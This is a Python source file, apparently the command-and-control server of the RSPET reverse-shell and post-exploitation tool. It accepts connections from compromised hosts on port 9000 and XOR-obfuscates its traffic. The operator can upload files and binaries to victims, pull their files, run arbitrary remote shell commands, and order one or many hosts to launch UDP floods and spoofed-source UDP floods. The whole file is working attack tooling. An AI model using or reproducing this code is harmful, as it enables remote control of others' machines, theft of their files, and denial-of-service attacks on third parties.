#!/usr/bin/python

from socket import socket, AF_INET, SOCK_STREAM
from thread import start_new_thread
from threading import Thread
from sys import exit as sysexit, argv, getsizeof
from time import sleep
import tab

def conn_accept(sock,handler):
    while True:
        (client, (ip,port)) = sock.accept()
        decode = recv_comm(1024,client)
        decode = decode.split("-")
        client_version = decode[0]
        client_type = decode[1]
        handler.add_host(client,(ip,port),(client_version,client_type))

def send_comm(command, cur_host_con):
    encode = bytearray(command)
    for i in range(len(encode)):
        encode[i] ^=0x41
    try:
        cur_host_con.send(encode)
        return 0
    except:
        return 1

def getLen(string, maxLen):
    tmp_str = str(len(string))
    lenToReturn = tmp_str
    for i in range(maxLen - len(tmp_str)):
        lenToReturn = '0' + lenToReturn
    return lenToReturn

def recv_comm(recv_size,cur_host_con):
    en_data = cur_host_con.recv(recv_size)
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^=0x41
    return decode

def printHosts(active_hosts,list_of_selected_hosts):
    for host_ID in list_of_selected_hosts:
        if active_hosts[host_ID] == None:
            continue
        current_host_ip = active_hosts[host_ID][1][0]
        current_host_port = active_hosts[host_ID][1][1]
        current_host_version = active_hosts[host_ID][2][0]
        current_host_type = active_hosts[host_ID][2][1]
        print ("["+str(host_ID)+"] "+current_host_ip+":"+str(current_host_port)+"\t"+current_host_version+"-"+current_host_type)
    return 0

def UDP_Flood(target,cur_host_con,cur_host_id,handler):
    target_IP = target[0]
    target_Port = target[1]
    try:
        PAYLOAD = target[2]
    except:
        PAYLOAD = "Hi"
    flood_command = '00005' # '00005' => 'udpFlood'
    res = send_comm(flood_command,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    toSend = target_IP+":"+str(target_Port)+":"+PAYLOAD
    sizeToSend = getLen(toSend,3)
    res = send_comm(sizeToSend,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(toSend,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    return 0

def UDP_Spoof(nameSet,cur_host_con,cur_host_id,handler):
    TARGET_IP = nameSet[0]
    TARGET_PORT = nameSet[1]
    SPOOFED_IP = nameSet[2]
    SPOOFED_PORT = nameSet[3]
    try:
        PAYLOAD = nameSet[4]
    except:
        PAYLOAD = 'Hi'
    spoof_command = '00006' # '00006' => 'udpSpoof'
    res = send_comm(spoof_command,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    toSend = TARGET_IP+":"+str(TARGET_PORT)+":"+SPOOFED_IP+":"+str(SPOOFED_PORT)+":"+PAYLOAD
    sizeToSend = getLen(toSend,3)
    res = send_comm(sizeToSend,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(toSend,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    return 0

def Make_File(nameSet,cur_host_con,cur_host_id,handler):
    fileToRead = nameSet[0]
    try:
        remoteFileName = nameSet[1]
    except:
        remoteFileName = fileToRead
    res = send_comm('00001',cur_host_con) #'00001' => 'getFile'
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    fname_size = getLen(remoteFileName,3)
    res = send_comm(fname_size,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(remoteFileName,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    decode = recv_comm(3,cur_host_con)
    if decode == "fna":
        return 2
    else:
        try:
            fileToRead = open(fileToRead,'r')
        except:
            return 3
        command = fileToRead.read()
        fileToRead.close()
        fSize = getLen(command,13)
        res = send_comm(fSize, cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        res = send_comm(command,cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        decode = recv_comm(3,cur_host_con)
        return 0

def Make_Binary(nameSet, cur_host_con, cur_host_id,handler):
    binToRead = nameSet[0]
    try:
        remoteBinName = nameSet[1]
    except:
        remoteBinName = binToRead
    res = send_comm('00002',cur_host_con) # '00002' => 'getBinary'
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    bname_size = getLen(remoteBinName,3)
    res = send_comm(bname_size,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(remoteBinName,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    decode = recv_comm(3,cur_host_con)
    if decode == "fna":
        return 2
    else:
        try:
            binToRead = open(binToRead,'rb')
        except:
            return 3
        command = binToRead.read()
        binToRead.close()
        bSize = getLen(command,13)
        res = send_comm(bSize,cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        res = send_comm(command,cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        decode = recv_comm(3,cur_host_con)
        return 0

def Pull_File(nameSet, cur_host_con, cur_host_id, handler):
    try:
        remoteFileName = nameSet[0]
    except:
        print ("Remote file name not provided")
        return 2
    try:
        localFileName = nameSet[1]
    except:
        localFileName = remoteFileName
    res = send_comm('00003',cur_host_con) # '00003' => 'sendFile'
    if res == 1:
        print ("Connection closed by client")
        handler.remove_host(cur_host_id)
        return 1
    fname_size = getLen(remoteFileName,3)
    res = send_comm(fname_size,cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(remoteFileName,cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        handler.remove_host(cur_host_id)
        return 1
    decode = recv_comm(3,cur_host_con)
    if decode == 'fna':
        print ("File does not exist or Access Denied")
        return 2
    else:
        try:
            localFile = open(localFileName,'w')
        except:
            print ("Cannot create local file")
            return 2
        decode = recv_comm(13,cur_host_con)
        decode = recv_comm(int(decode),cur_host_con)
        localFile.write(decode)
        localFile.close()
        return 0

def Pull_Binary(nameSet, cur_host_con, cur_host_id, handler):
    try:
        remoteBinName = nameSet[0]
    except:
        print ("Remote binary name not provided")
        return 2
    try:
        localBinName = nameSet[1]
    except:
        localBinName = remoteBinName
    res = send_comm('00004',cur_host_con) # '00004' => 'sendBinary'
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    bname_size = getLen(remoteBinName,3)
    res = send_comm(bname_size,cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(remoteBinName,cur_host_con)
    if res == 1:
        print ("Connection closed by client")
        handler.remove_host(cur_host_id)
        return 1
    decode = recv_comm(3,cur_host_con)
    if decode == 'fna':
        print ("File does not exist or Access Denied")
        return 2
    else:
        try:
            localBin = open(localBinName,'wb')
        except:
            print ("Cannot create local file")
            return 2
        decode = recv_comm(13,cur_host_con)
        decode = recv_comm(int(decode),cur_host_con)
        localBin.write(decode)
        localBin.close()
        return 0

def MultihostCalls(funcRef,argsList,handler,list_of_selected_hosts):
    jobs = []
    active_hosts = handler.return_list_of_hosts()
    for host_at_hand in list_of_selected_hosts:
        if active_hosts[host_at_hand] == None:
            continue
        argsToPass = [argsList, active_hosts[host_at_hand][0], host_at_hand, handler]
        t = Thread(target=funcRef,args=argsToPass)
        jobs.append(t)
    if not jobs:
        print("All the selected hosts have closed their connections")
        print("Exiting to main interface ...")
        return 1
    for j in jobs:
        j.start()
    for j in jobs:
        j.join()
    return 0

def list_root_commands():
    print ("List of Server Commands")
    print ("$List_Commands -> Display this list")
    print ("$List_Hosts -> Display connected hosts")
    print ("$Choose_Host host_no -> Select host from list")
    print ("$Select (commaSeperatedHostIDs) -> Select specified hosts")
    print ("$ALL -> Select all hosts and display available commands")
    print ("$Exit -> Exit this program")

def list_connected_commands():
    print ("List of Commands when Host is Selected")
    print ("$List_Commands -> Display this list")
    print ("$Make_File localFileName (remoteFileName)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$Pull_File remoteFileName (localFileName)-> Get remote file")
    print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
    print ("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
    print ("$KILL -> All selected Hosts stop current perpetual task")
    print ("$Close_Connection -> Close Connection and remove host")
    print ("$Exit -> Exit to the main interface")

def list_connected_mult_commands():
    print ("List of Commands when ALL Host are Selected")
    print ("$List_Commands -> Display this list")
    print ("$List_Sel_Hosts -> Display selected hosts")
    print ("$Make_File localFileName (remoteFileName)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$UDP_Flood targetIP targetPort (msg) -> All selected Hosts flood target")
    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
    print ("$KILL -> All selected Hosts stop current perpetual task")
    print ("$Close_Connection -> close connection with and remove all selected hosts")
    print ("$Exit -> Exit to the main interface")

def make_logo():
    logo = []
    logo.append("#####################################################")
    logo.append("__________  _________________________________________")
    logo.append("\______   \/   _____/\______   \_   _____/\__    ___/")
    logo.append(" |       _/\_____  \  |     ___/|    __)_   |    |   ")
    logo.append(" |    |   \/        \ |    |    |        \  |    |   ")
    logo.append(" |____|_  /_______  / |____|   /_______  /  |____|   ")
    logo.append("        \/        \/                   \/            ")
    logo.append("")
    logo.append("-Author: panagiks (http://panagiks.xyz) -Licence: MIT")
    logo.append("#####################################################")
    logo.append("")
    for line in logo:
        print(line)

class RSPET_client_handler():
    list_of_hosts = []
    def __init__(self):
        self.list_of_hosts = []

    def add_host(self, host, ip_port_tup, ver_type_tup):
        self.list_of_hosts.append([host,ip_port_tup,ver_type_tup])

    def remove_host(self, host_id):
        self.list_of_hosts[host_id] = None

    def rebuild(self):
        tmp_list = list(filter(lambda a: a != None , self.list_of_hosts))
        self.list_of_hosts = tmp_list

    def return_list_of_hosts(self):
        return self.list_of_hosts

root_command_dict = {
    "List_Commands" : 0,
    "List_Hosts"    : 1,
    "Choose_Host"   : 2,
    "Select"        : 3,
    "ALL"           : 4,
    "Exit"          : 5}

conn_command_func_dict = {
    "Make_File"        : Make_File,
    "Make_Binary"      : Make_Binary,
    "Pull_File"        : Pull_File,
    "Pull_Binary"      : Pull_Binary,
    "UDP_Flood"        : UDP_Flood,
    "UDP_Spoof"        : UDP_Spoof}

conn_mul_command_func_dict = {
    "Make_File"        : Make_File,
    "Make_Binary"      : Make_Binary,
    "UDP_Flood"        : UDP_Flood,
    "UDP_Spoof"        : UDP_Spoof}

conn_command_dict = {
    "List_Commands"    : 0,
    "KILL"             : 1,
    "Close_Connection" : 2,
    "Exit"             : 3}

conn_mul_command_dict = {
    "List_Commands"    : 0,
    "List_Sel_Hosts"   : 1,
    "KILL"             : 2,
    "Close_Connection" : 3,
    "Exit"             : 4}

#Start Here!
make_logo()
try:
    max_conns = int(argv[1])
except:
    max_conns = 5

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0",9000))
s.listen(max_conns)

handler = RSPET_client_handler()
start_new_thread(conn_accept,(s,handler))

list_root_commands()
while True:
    handler.rebuild()
    comm_body = ""
    comm_args = []
    cur_host_ip = ""
    cur_host_id = 0
    command = raw_input("~$ ")
    command = command.split(" ")
    comm_body = command[0]

    for i in range(1,len(command)):
        comm_args.append(command[i])
    try:
        translated = root_command_dict[comm_body]
    except:
        print ("Command not recognised! Try List_Commands for help")
        continue
    if translated == 0: #List_Commands
        list_root_commands()
    elif translated == 1: #List_Hosts
        active_hosts = handler.return_list_of_hosts()
        list_of_selected_hosts = []
        for i in range(len(active_hosts)):
            list_of_selected_hosts.append(i)
        printHosts(active_hosts,list_of_selected_hosts)
    elif translated == 2: #Choose_Host
        try:
            cur_host_id = int(comm_args[0])
        except:
            print ("Argument missing or not int")
            continue
        active_hosts = handler.return_list_of_hosts()
        try:
            cur_host_ip = active_hosts[cur_host_id][1][0]
            cur_host_con = active_hosts[cur_host_id][0]
        except:
            print ("Host ID out of bounds")
            continue
        list_connected_commands()
        while True:
            command = raw_input("["+cur_host_ip+"]~$ ")
            if not command:
                continue
            command = command.split(" ")
            comm_body = command[0]
            try:
                comm_trans = conn_command_dict[comm_body]
                if comm_trans == 0: #List_Commands
                    list_connected_commands()
                elif comm_trans == 1: #KILL
                    res = send_comm('00008',cur_host_con) # '00008' => 'KILL'
                    if res == 1:
                        print("Current host has closed its connection")
                        print("Exiting to main interface ...")
                        break
                elif comm_trans == 2: #Close_Connection
                    res = send_comm('00000',cur_host_con) # '00000' => 'killMe'
                    cur_host_con.close()
                    handler.remove_host(cur_host_id)
                    break
                elif comm_trans == 3: #Exit
                    break
            except KeyError:
                try:
                    funcToCall = conn_command_func_dict[comm_body]
                    argsToPass = command[1:]
                    funcToCall(argsToPass,cur_host_con,cur_host_id,handler)
                except KeyError:
                    com_reconst = command
                    command = ''
                    command = " ".join(com_reconst)
                    res = send_comm('00007',cur_host_con)
                    if res == 1:
                        print ("Connection closed by client")
                        break
                    lenCommand = getLen(command,13)
                    res = send_comm(lenCommand,cur_host_con)
                    if res == 1:
                        print ("Connection closed by client")
                        break
                    res = send_comm(command,cur_host_con)
                    if res == 1:
                        print ("Connection closed by client")
                        break
                    decode = recv_comm(13,cur_host_con)
                    decode = recv_comm(int(decode),cur_host_con)
                    print (decode)
    elif translated == 3: #Select
        try:
            hosts_string = command[1]
        except:
            print ("No host IDs provided")
            continue
        list_of_selected_hosts = []
        try:
            hosts_string = hosts_string.split(",")
            for host_ID in hosts_string:
                list_of_selected_hosts.append(int(host_ID.replace(" ","")))
        except:
            print ("Host IDs not integers")
            continue
        list_connected_mult_commands()
        while True:
            command = raw_input("[MULTIPLE]~$ ")
            command = command.split(" ")
            comm_body = command[0]
            try:
                comm_trans = conn_mul_command_dict[comm_body]
                if comm_trans == 0: #List_Commands
                    list_connected_commands()
                elif comm_trans == 1: #List_Sel_Hosts
                    active_hosts = handler.return_list_of_hosts()
                    printHosts(active_hosts,list_of_selected_hosts)
                elif comm_trans == 2: #KILL
                    active_hosts = handler.return_list_of_hosts()
                    for host_at_hand in list_of_selected_hosts:
                        if active_hosts[host_at_hand] == None:
                            continue
                        send_comm('00008',active_hosts[host_at_hand][0]) # '00008' => 'KILL'
                elif comm_trans == 3: #Close_Connection
                    jobs = []
                    active_hosts = handler.return_list_of_hosts()
                    for j in range(len(list_of_selected_hosts)-1,-1,-1):
                        host_at_hand = list_of_selected_hosts[j]
                        if active_hosts[host_at_hand] == None:
                            continue
                        res = send_comm('00000',active_hosts[host_at_hand][0]) # '00000' => 'killMe'
                        active_hosts[host_at_hand][0].close()
                        handler.remove_host(host_at_hand)
                    break
                elif comm_trans == 4: #Exit
                    break
            except KeyError:
                try:
                    funcToCall = conn_mul_command_func_dict[comm_body]
                    argsToPass = command[1:]
                    active_hosts = handler.return_list_of_hosts()
                    MultihostCalls(funcToCall, argsToPass, handler, list_of_selected_hosts)
                except KeyError:
                    print ("Command not recognised")
    elif translated == 4: #ALL
        active_hosts = handler.return_list_of_hosts()
        list_of_selected_hosts = []
        for host_ID in range(len(active_hosts)):
            list_of_selected_hosts.append(host_ID)
        list_connected_mult_commands()
        while True:
            command = raw_input("[ALL]~$ ")
            command = command.split(" ")
            comm_body = command[0]
            try:
                comm_trans = conn_mul_command_dict[comm_body]
                if comm_trans == 0: #List_Commands
                    list_connected_commands()
                elif comm_trans == 1: #List_Sel_Hosts
                    active_hosts = handler.return_list_of_hosts()
                    printHosts(active_hosts,list_of_selected_hosts)
                elif comm_trans == 2: #KILL
                    active_hosts = handler.return_list_of_hosts()
                    for host_at_hand in list_of_selected_hosts:
                        if active_hosts[host_at_hand] == None:
                            continue
                        send_comm('00008',active_hosts[host_at_hand][0]) # '00008' => 'KILL'
                elif comm_trans == 3: #Close_Connection
                    jobs = []
                    active_hosts = handler.return_list_of_hosts()
                    for j in range(len(list_of_selected_hosts)-1,-1,-1):
                        host_at_hand = list_of_selected_hosts[j]
                        if active_hosts[host_at_hand] == None:
                            continue
                        res = send_comm('00000',active_hosts[host_at_hand][0]) # '00000' => 'killMe'
                        active_hosts[host_at_hand][0].close()
                        handler.remove_host(host_at_hand)
                    break
                elif comm_trans == 4: #Exit
                    break
            except KeyError:
                try:
                    funcToCall = conn_mul_command_func_dict[comm_body]
                    argsToPass = command[1:]
                    active_hosts = handler.return_list_of_hosts()
                    MultihostCalls(funcToCall, argsToPass, handler, list_of_selected_hosts)
                except KeyError:
                    print ("Command not recognised")
    elif translated == 5: #Exit
        s.close()
        sysexit()
